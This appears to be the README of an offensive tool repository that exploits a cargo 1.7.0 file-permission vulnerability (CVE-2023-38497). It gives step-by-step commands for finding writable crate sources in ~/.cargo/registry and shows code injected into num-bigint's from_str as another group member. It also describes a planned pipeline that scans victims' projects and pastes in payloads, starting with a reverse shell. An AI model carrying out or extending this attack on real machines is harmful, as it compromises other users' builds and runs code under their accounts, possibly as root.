
## Description
A new vulnerability in cargo version `1.7.0` has been found as explained [here](https://blog.rust-lang.org/2023/08/03/cve-2023-38497.html).

## Step by Step

First you have to make sure your cargo version is vulnerable

`cargo --version`

Supose I have a cargo project with the following `src/main.rs` file:

```
use num_bigint::BigInt;
use std::str::FromStr;

// Silly guessing game
fn main() {
    let secret_number = BigInt::from_str("123456789");
    loop {
        println!("Make a guess: ");
        let mut guess = String::new();
        std::io::stdin()
            .read_line(&mut guess)
            .expect("Error reading stdin");
        let guess = BigInt::from_str(guess.trim());
        if guess == secret_number {
            println!("That's right");
            break;
        }
    }
}
```

If I run the program:
```
cargo run
Make a guess:
20
Make a guess:
123456789
That's right!
```

Nothing wrong here.

Next, for all installed crates in your system, filter the ones whose permissions have bad configuration, that is, can be written by group or any other machine users

`find ~/.cargo/registry/src/* -type f -writable -print | egrep "*\.rs"`

This will yield a list of all vulnerable rust source files. From these chose the file that is suitable for your attack, which should be one in which there is defined a method that is used in the source code of the target cargo project.

And from the listing above I find the following vulnerable file: 

`$HOME/.cargo/registry/src/index.crates.io-.../num-bigint-0.1.44/src/bigint.rs`

Which as promised previously has the following permissions: `-rw-rw-r--`

Therefore it can be modified by any user in the same group as the cargo project owner, that's scary. But imagine any user could write that file, well there are crates with such permissions.

Now you can add a new user to your machine, or use an existing one other than the project user which belongs to the same group as the user for the file we're targeting. For example that source file in my machine has the following owner and group
`atreides people`
and another user I have, returns the following from running `id` command on him:

`uid=54322(bob) gid=54331(bob) groups=54331(bob),1000(people)`

Now we know user `bob` can write our target file and any other with such permissions. Switch to `bob` and follow up.

Taking a look into our guessing game we can see it is being used the `from_str` method from `BigInt` struct. That could be an interesting method to look at.

From the target file I've extracted this piece of code: 
```
impl FromStr for BigInt {
    type Err = ParseBigIntError;

    #[inline]
    fn from_str(s: &str) -> Result<BigInt, ParseBigIntError> {
        BigInt::from_str_radix(s, 10)
    }
}
```

Now, what if you make it look like this
```
impl FromStr for BigInt {
    type Err = ParseBigIntError;

    #[inline]
    fn from_str(s: &str) -> Result<BigInt, ParseBigIntError> {
        println!("Message from beyond");
        BigInt::from_str_radix(s, 10)
    }
}
```

And rerun it cleaning the target directory:
```
cargo clean && cargo run
Make a guess:
20
Message from beyond
Make a guess:
123456789
Message from beyond
That's right!
```

Woah! Imagine you are writting your cargo project and you get the following messages.

Note that this will only happen whenever the target directory has been deleted previously, that is, cargo has to compile the crate after you modify the source file.

Now, this is only a demo on how to exploit this vulnerability, but imagine if you place any sort of payload inside a source file. This repo aims to establish reverse shell connection with the user's account whenever he runs a cargo project.

This is a mayor vulnerability if you consider that there could be cargo installations with root privileges so the placed payload would be executing with such permissions.

# Project Structure

In this project you will find the following utilities:

## Vulnerability analyzer

Searches accross the local cargo archive and a target cargo project to find all specific methods that could be exploited in the target's source code.
If there's a method in particular you'd like to exploit or you don't have read permissions on the target cargo project, skip the vanalyzer in the attack pipeline.

```
./vanalyzer/run.sh <target-project-path> <target-username>
```

## Available payloads

All payload types (reverse shell mainly and other malware) that can be placed inside a target crate source code. All available payloads as of now are:

- Reverse Shell (first that will be implemented)

## Integration

Mock shell that receives commands to run the vulnerability analyzer and
take one of the payloads listed above and a selected method to exploit from the vulnerability analyzer and integrates (copy and paste) the payload into the source code.

# Attack pipeline
1. Run the mock shell (cargo project)

`cargo run`

2.
- Via vanalyzer +  integrate commands

`vanalyzer <cargo_project> <target_username>`

`integrate <file_no> <method_no> <payload>`

- Via exploit

`exploit <path_to_local_archive_crate_file> <method's_name> <payload>`

3. Run ok command

`ok`
